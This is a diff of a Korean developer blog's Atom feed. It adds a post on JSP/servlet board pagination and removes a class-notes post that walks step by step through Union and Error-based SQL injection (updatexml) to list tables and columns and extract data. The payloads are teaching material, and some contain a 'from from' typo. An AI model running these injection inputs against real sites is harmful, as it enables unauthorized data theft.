@@ -1,4 +1,171 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-12T01:40:35+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOusuOyepeydhCDqsoDsg4ntlZzri6QuXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOusuOyepeydtCDrk6TslrTqsIDripQg6rKM7Iuc7YyQIOuqqeuhneydhCDsmpTssq3tlZzri6QuXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOqyjOyLnO2MkCDrqqnroZ0g7J2R64u1Llxu7ISc67KEIC0-PiDshJzrsoQgOiDqsozsi5ztjJAg7Y6Y7J207KeAIOyZhOyEsS5cbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc7YyQIO2OmOydtOyngCDsnZHri7UuIiwibWVybWFpZCI6bnVsbH0" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Blind SQL Injection 실습</title><link href="http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5/" rel="alternate" type="text/html" title="Blind SQL Injection 실습" /><published>2023-05-12T00:00:00+09:00</published><updated>2023-05-12T23:13:00+09:00</updated><id>http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5</id><content type="html" xml:base="http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5/"><![CDATA[<h2 id="실습-환경">실습 환경</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-16T00:34:37+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOusuOyepeydhCDqsoDsg4ntlZzri6QuXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOusuOyepeydtCDrk6TslrTqsIDripQg6rKM7Iuc7YyQIOuqqeuhneydhCDsmpTssq3tlZzri6QuXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOqyjOyLnO2MkCDrqqnroZ0g7J2R64u1Llxu7ISc67KEIC0-PiDshJzrsoQgOiDqsozsi5ztjJAg7Y6Y7J207KeAIOyZhOyEsS5cbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc7YyQIO2OmOydtOyngCDsnZHri7UuIiwibWVybWFpZCI6bnVsbH0" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">웹 서버 개발 12 페이징 번호</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C12%ED%8E%98%EC%9D%B4%EC%A7%95/" rel="alternate" type="text/html" title="웹 서버 개발 12 페이징 번호" /><published>2023-05-16T00:00:00+09:00</published><updated>2023-05-16T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C12%ED%8E%98%EC%9D%B4%EC%A7%95</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C12%ED%8E%98%EC%9D%B4%EC%A7%95/"><![CDATA[<h2 id="게시글-페이징-번호">게시글 페이징 번호</h2>
+<ul>
+  <li><a href="https://stackoverflow.com/search?page=29&amp;tab=Relevance&amp;pagesize=15&amp;q=jsp&amp;searchOn=3&amp;s=48d80aca-ac2a-486e-8868-d30aed82bf58">stackoverflow</a>의 페이징 스타일을 참고하였다.</li>
+  <li>현재 페이지에 5개의 게시글을 보여준다.</li>
+  <li>나중에 사용자가 한 페이지에 볼 수 있는 게시글 수를 정할수 있게 할 것이다.</li>
+  <li>완성된 페이징 페이지.<br />
+<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/ff3b6285-554c-4496-a7bf-2e21de43a8e9" alt="Pasted image 20230515223925" /></li>
+</ul>
+
+<h3 id="jsp">JSP</h3>
+<ul>
+  <li>게시글의 베이스가 되는 jsp 파일을 수정하였다.</li>
+</ul>
+
+<h4 id="notice_boardjsp">notice_board.jsp</h4>
+<ul>
+  <li>servlet 으로 부터 현재 페이지와 마지막 페이지 정보를 받아온다.</li>
+  <li>페이징 번호 리스트 정보를 받아온다.</li>
+</ul>
+
+<script src="https://gist.github.com/MinGyu2/a2b399311e658a135115829604a4721f.js"></script>
+
+<p><br /></p>
+<ul>
+  <li>페이징 번호 리스트 정보를 이용하여 페이징 부분을 그려준다.</li>
+  <li>리스트에 들어있는 0은 생략을 의미한다.</li>
+</ul>
+
+<script src="https://gist.github.com/MinGyu2/3837b0845cb1383d7183418bfe310d75.js"></script>
+
+<p><br /></p>
+
+<ul>
+  <li>총 게시글 수 보여주기.</li>
+  <li>servlet 으로 부터 받은 총 게시글 수를 보여준다.</li>
+</ul>
+
+<script src="https://gist.github.com/MinGyu2/0d2bee07d5992c7a8f9d636392476f66.js"></script>
+
+<p><br /></p>
+<ul>
+  <li>페이징 번호 스타일.</li>
+</ul>
+
+<script src="https://gist.github.com/MinGyu2/c0c2034a0350abe4dba5f3b38e5d2b84.js"></script>
+
+<p><br /></p>
+
+<ul>
+  <li>참고</li>
+  <li>form 에서 input이 여러개면 엔터를 눌러도 submit 이 안된다.</li>
+  <li>이럴 때는 type이 submit 인 input을 만들어 줘야한다.</li>
+</ul>
+
+<script src="https://gist.github.com/MinGyu2/4733be6980bb83915c196cc75387d2bb.js"></script>
+
+<p><br /></p>
+
+<h3 id="servlet">Servlet</h3>
+
+<h4 id="mainpagejava">MainPage.java</h4>
+
+<ul>
+  <li>uriSearch 함수의 게시판 부분이다.</li>
+</ul>
+
+<script src="https://gist.github.com/MinGyu2/90ed9ab083b6c47dac20bc5ac85a419d.js"></script>
+
+<p><br /></p>
+<ul>
+  <li>현재 페이지 정보를 get의 파라미터로 받아온다.</li>
+  <li>즉 <code class="language-plaintext highlighter-rouge">url?page=2&amp;q=검색</code> 형태이다.</li>
+  <li>페이지 정보를 못 받아오거나 음수면 페이지를 1로 초기화를 진행한다.</li>
+</ul>
+
+<script src="https://gist.github.com/MinGyu2/33f35d284dbcef6939581c769bc071dc.js"></script>
+
+<p><br /></p>
+<ul>
+  <li>검색 결과에 해당하는 총 게시글의 수 구하기.</li>
+</ul>
+
+<script src="https://gist.github.com/MinGyu2/319742435a0083c49288524bac837b50.js"></script>
+
+<p><br /></p>
+<ul>
+  <li>한 페이지 보여줄 게시글의 수를 정한다.</li>
+  <li>마지막 페이지를 구해준다.</li>
+  <li>사용자로 부터 받은 페이지 수가 마지막 페이지 보다 크다면 마지막 페이지로 리다이렉트 한다.</li>
+  <li>sql문으로 검색을 하기위해서 실제 데이터의 시작 위치를 계산하여 준다.</li>
+</ul>
+
+<script src="https://gist.github.com/MinGyu2/183a2b08e5bbe4c24e503059f1b57340.js"></script>
+
+<p><br /></p>
+
+<ul>
+  <li>검색 데이터 가져오기.</li>
+  <li>여기서는 5개의 게시글을 가져온다.</li>
+</ul>
+
+<script src="https://gist.github.com/MinGyu2/60563c690675f704572ed2b2fb53e86b.js"></script>
+
+<p><br /></p>
+
+<ul>
+  <li>페이징 번호를 저장하기 위한 리스트를 만들어준다.</li>
+  <li>한번에 몇개의 페이징번호를 보여줄지 정해준다.</li>
+  <li>해당 리스트에 0은 생략을 의미한다.</li>
+  <li>예를들어 현재 페이지가 <code class="language-plaintext highlighter-rouge">6</code>이고 마지막 페이지가 <code class="language-plaintext highlighter-rouge">10</code> 이면 페이징 형태가 다음과 같다.  <br /><code class="language-plaintext highlighter-rouge">1 ... 4 5 6 7 8 ... 10</code></li>
+</ul>
+
+<script src="https://gist.github.com/MinGyu2/55e88f3c9e0541a01bf2e5f7e3fe016b.js"></script>
+
+<p><br /></p>
+
+<ul>
+  <li>페이지를 그리기위하여 <code class="language-plaintext highlighter-rouge">mainpage jsp</code>로 지금까지 만들었던 정보를 넘겨준다.</li>
+</ul>
+
+<script src="https://gist.github.com/MinGyu2/ff414408dd9e1e1f57987724682add56.js"></script>
+
+<p><br /></p>
+
+<h4 id="noticeboarddaojava">NoticeBoardDAO.java</h4>
+
+<ul>
+  <li>검색목록을 가져오는 getNoticeList 함수를 수정하였다.</li>
+  <li>모든 목록을 가져오는 것이아닌 정해준 갯수의 게시물 목록만 가지고 온다.</li>
+  <li>게시글의 시작위치와 가져올 갯수를 함수의 인자로 준다.</li>
+</ul>
+
+<script src="https://gist.github.com/MinGyu2/64410a9c64396ddadf7daae2e395c527.js"></script>
+
+<p><br /></p>
+<ul>
+  <li>sql 쿼리문에 특정 갯수만 출력을 하기위한 구문을 추가한다.</li>
+  <li><code class="language-plaintext highlighter-rouge">prepared statment</code>를 이용하였다.</li>
+</ul>
+
+<script src="https://gist.github.com/MinGyu2/4becbc45b945e4751efaed31724bcf75.js"></script>
+
+<p><br /></p>
+
+<ul>
+  <li>검색된 게시판 목록 총 개수 구하기.</li>
+</ul>
+
+<script src="https://gist.github.com/MinGyu2/a81e9332c5ece965cee636428604b360.js"></script>
+
+<h3 id="전체코드">전체코드</h3>
+
+<h4 id="mainpagejava-1">MainPage.java</h4>
+<script src="https://gist.github.com/MinGyu2/95dee19807c4b09f512b2584b0f3e224.js"></script>
+
+<h4 id="noticeboarddaojava-1">NoticeBoardDAO.java</h4>
+<script src="https://gist.github.com/MinGyu2/a0071a20f1b991dadccc9e8c307a1ab4.js"></script>
+
+<script src="https://gist.github.com/MinGyu2/7e955cecf219df3a91a6012bb3fbf428.js"></script>
+
+<h4 id="notice_boardjsp-1">notice_board.jsp</h4>
+<script src="https://gist.github.com/MinGyu2/7e955cecf219df3a91a6012bb3fbf428.js"></script>
+
+<h3 id="웹-프로젝트">웹 프로젝트</h3>
+<ul>
+  <li><a href="https://github.com/MinGyu2/MyHomePage">MinGyu2/MyHomePage (github.com)</a></li>
+  <li><a href="https://github.com/MinGyu2/myWeb">MinGyu2/myWeb (github.com)</a></li>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="웹" /><category term="jsp" /><category term="servlet" /><summary type="html"><![CDATA[게시글에 페이징 번호를 추가하자.]]></summary></entry><entry><title type="html">Blind SQL Injection 실습</title><link href="http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5/" rel="alternate" type="text/html" title="Blind SQL Injection 실습" /><published>2023-05-12T00:00:00+09:00</published><updated>2023-05-12T23:13:00+09:00</updated><id>http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5</id><content type="html" xml:base="http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5/"><![CDATA[<h2 id="실습-환경">실습 환경</h2>
 <ul>
   <li>오라클 DB</li>
 </ul>
@@ -1186,168 +1353,4 @@ blind sql injection success
   <li><a href="https://ggmouse.tistory.com/417">JavaScript this 인자 전달 onclick/href (tistory.com)</a></li>
   <li><a href="https://www.w3schools.com/howto/tryit.asp?filename=tryhow_css_login_form_modal">W3Schools Tryit Editor</a></li>
   <li><a href="https://www.epost.go.kr/search.RetrieveIntegrationNewZipCdList.comm">우편번호검색 - 통합검색 우편번호 (epost.go.kr)</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Oracle DB" /><category term="웹서버" /><category term="servlet" /><category term="jsp" /><summary type="html"><![CDATA[주소검색 기능을 만들어보자.]]></summary></entry><entry><title type="html">Union SQLi &amp;amp; Error Based SQLi 과정 정리</title><link href="http://localhost:4000/SQLi%EB%B0%A9%EB%B2%95/" rel="alternate" type="text/html" title="Union SQLi &amp;amp; Error Based SQLi 과정 정리" /><published>2023-04-24T00:00:00+09:00</published><updated>2023-04-30T23:13:00+09:00</updated><id>http://localhost:4000/SQLi%EB%B0%A9%EB%B2%95</id><content type="html" xml:base="http://localhost:4000/SQLi%EB%B0%A9%EB%B2%95/"><![CDATA[<h2 id="환경">환경</h2>
-<ul>
-  <li>MYSQL 서버</li>
-</ul>
-
-<p><br /></p>
-
-<h2 id="union-sqli">Union SQLi</h2>
-
-<h3 id="조건">조건</h3>
-<ul>
-  <li>질의문 결과가 화면에 보여야 한다.</li>
-</ul>
-
-<h3 id="동작-유형">동작 유형</h3>
-<ul>
-  <li>게시판 ( 글이 화면에 나온다. )</li>
-  <li>회원정보 ( 마이페이지 )</li>
-  <li>주소검색</li>
-  <li>검색 페이지</li>
-</ul>
-
-<h3 id="과정">과정</h3>
-<ol>
-  <li>서버에서 어떤 질의문을 사용하는지 추측하기.
-    <ul>
-      <li>질의문 추측 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%----%' ...</code></li>
-    </ul>
-  </li>
-  <li><strong>SQL Injection</strong> 취약점 존재하는지 확인하기.
-    <ul>
-      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' and '1%'='1%' ...</code></li>
-      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' and '1%'='1</code></li>
-    </ul>
-  </li>
-  <li>컬럼수 찾기.
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">order by</code> 를 이용하여 1씩 증가 시키면서 컬럼수를 찾아준다.</li>
-      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' order by 1 -- %' ...</code></li>
-      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' order by 1 -- </code></li>
-    </ul>
-  </li>
-  <li>data 출력 위치 파악하기.
-    <ul>
-      <li>위에서 찾은 컬럼수를 이용하여 data 출력 위치 파악하기.</li>
-      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' union select '1','2','3','4' from dual -- %' ...</code></li>
-      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1','2','3','4' from dual -- </code></li>
-    </ul>
-  </li>
-  <li>database 이름 출력하기.
-    <ul>
-      <li>위에서 파악한 출력위치를 이용하여 DB 이름을 알아보자.</li>
-      <li><code class="language-plaintext highlighter-rouge">select database() from dual</code> 명령을 이용하면 현재 DB 명이 나온다.</li>
-      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' union select '1',database(),'3','4' from dual -- %' ...</code></li>
-      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1',database(),'3','4' from dual -- </code></li>
-    </ul>
-  </li>
-  <li>table 이름 출력하기.
-    <ul>
-      <li>위에서 파악한 DB이름을 이용하여 존재하는 테이블명을 알아보자.</li>
-      <li><code class="language-plaintext highlighter-rouge">select table_name from information_schema.tables where table_schema='DB명'</code> 명령을 이용하면 테이블명을 알 수 있다.</li>
-      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' union select '1',table_name,'3','4' from from information_schema.tables where table_schema='DB명' -- %' ...</code></li>
-      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1',table_name,'3','4' from from information_schema.tables where table_schema='DB명' -- </code></li>
-    </ul>
-  </li>
-  <li>column 이름 출력하기.
-    <ul>
-      <li>위에서 파악한 table 이름을 이용하여 table의 컬럼명을 알아보자.</li>
-      <li><code class="language-plaintext highlighter-rouge">select column_name from information_schema.columns where table_name='테이블명'</code> 명령을 이용하면 해당 table의 컬럼명을 알 수 있다.</li>
-      <li>질의문 = `select xxxx from xxx where 컬럼명 like ‘%test%’ union select ‘1’,column_name,’3’,’4’ from information_schema.columns where table_name=’테이블명’ – %’ …</li>
-      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1',column_name,'3','4' from information_schema.columns where table_name='테이블명' -- </code></li>
-    </ul>
-  </li>
-  <li>정보 빼오기.
-    <ul>
-      <li>위에서 파악한 table명과 해당 table에 대한 column 명을 이용하여 정보를 빼오자!</li>
-      <li><code class="language-plaintext highlighter-rouge">select column명 from table명</code> 명령을 이용하여 저장된 정보를 알 수 있다.</li>
-      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' union select '1',column명,'3','4' from table명 -- %' ...</code></li>
-      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1',column명,'3','4' from table명 -- </code>
-<br /><br /></li>
-    </ul>
-  </li>
-</ol>
-
-<p><br /><br /></p>
-
-<h2 id="error-based-sqli">Error Based SQLi</h2>
-<ul>
-  <li>논리 에러를 의도적으로 일으켜 데이터를 추출하는 공격이다.</li>
-</ul>
-
-<h3 id="조건-1">조건</h3>
-<ul>
-  <li>Error 메세지가 화면에 보여야한다.</li>
-</ul>
-
-<h3 id="동작-유형-1">동작 유형</h3>
-<ul>
-  <li>로그인 페이지</li>
-  <li>아이디 중복 체크</li>
-</ul>
-
-<h3 id="sql-논리-에러를-발생시킬-수-있는-함수">SQL 논리 에러를 발생시킬 수 있는 함수</h3>
-<ul>
-  <li>updatexml</li>
-  <li>ExtractValue</li>
-</ul>
-
-<h3 id="과정-1">과정</h3>
-<ol>
-  <li>서버에서 어떤 질의문을 사용하는지 추측하기.
-    <ul>
-      <li>질의문 추측 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='----' ...</code></li>
-    </ul>
-  </li>
-  <li>오류 발생 확인하기. ( db 에러인지 확인하기 )
-    <ul>
-      <li>입력 = <code class="language-plaintext highlighter-rouge">' asd</code></li>
-      <li><strong>syntax error 발생(문법 에러)</strong> 가 발생하는 것을 확인이 가능한지 본다.</li>
-    </ul>
-  </li>
-  <li>Error Based SQL Injection Function 동작하는지 확인하기.
-    <ul>
-      <li>Syntax error (문법에러) : 문법 틀리면 안됨. 컴파일 할 때 잡아낸다.</li>
-      <li>논리에러 : 실행이된다.</li>
-      <li>즉 우리는 논리에러를 발생시켜야 한다.</li>
-      <li><strong>updatexml</strong> 함수를 이용하자!</li>
-      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,'test'), null) and '1'='1' ...</code></li>
-      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,'test'), null) and '1'='1</code></li>
-      <li><code class="language-plaintext highlighter-rouge">XPATH syntax error: ':test'</code> 에러를 볼 수 있다.</li>
-      <li><code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(SQL)), null) and '1'='1' ...</code> test 대신 질의문을 넣어주면 된다.</li>
-    </ul>
-  </li>
-  <li>Database 이름 출력하기.
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">select database() from dual</code>  로 DB 명 찾기</li>
-      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(select database() from dual)), null) and '1'='1' ...</code></li>
-      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select database() from dual)), null) and '1'='1</code></li>
-    </ul>
-  </li>
-  <li>table 이름 출력하기.
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">select table_name from information_schema.tables where table_schema='DB명' limit 0,1</code> 로 table 명 찾기.</li>
-      <li>오류는 하나의 데이터만 보여줄 수 있다. 따라서 출력을 1개로 제한하였다.</li>
-      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(select table_name from information_schema.tables where table_schema='DB명' limit 0,1)), null) and '1'='1' ...</code></li>
-      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select table_name from information_schema.tables where table_schema='DB명' limit 0,1)), null) and '1'='1</code></li>
-      <li><code class="language-plaintext highlighter-rouge">limit</code> 를 조절하면서 원하는 테이블명을 찾는다.</li>
-    </ul>
-  </li>
-  <li>column 이름 출력하기.
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">select column_name from information_schema.columns where table_name='테이블명' limit 0,1</code> 로 table에 해당하는 column명 찾기.</li>
-      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(select column_name from information_schema.columns where table_name='테이블명' limit 0,1)), null) and '1'='1' ...</code></li>
-      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select column_name from information_schema.columns where table_name='테이블명' limit 0,1)), null) and '1'='1</code></li>
-    </ul>
-  </li>
-  <li>정보 빼오기
-    <ul>
-      <li>위에서 파악한 table명과 해당 table에 대한 column 명을 이용하여 정보를 빼오자!</li>
-      <li><code class="language-plaintext highlighter-rouge">select column명 from table명 limit 0,1</code> 명령을 이용하여 저장된 정보를 알 수 있다.</li>
-      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(select column명 from table명 limit 0,1)), null) and '1'='1' ...</code></li>
-      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select column명 from table명 limit 0,1)), null) and '1'='1</code></li>
-    </ul>
-  </li>
-</ol>]]></content><author><name>Jung MinGyu</name></author><category term="Mysql" /><category term="DB" /><category term="sql injection" /><summary type="html"><![CDATA[sql injection 보다 쉽게 할 수 있는 과정을 정리하였다.]]></summary></entry></feed>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Oracle DB" /><category term="웹서버" /><category term="servlet" /><category term="jsp" /><summary type="html"><![CDATA[주소검색 기능을 만들어보자.]]></summary></entry></feed>
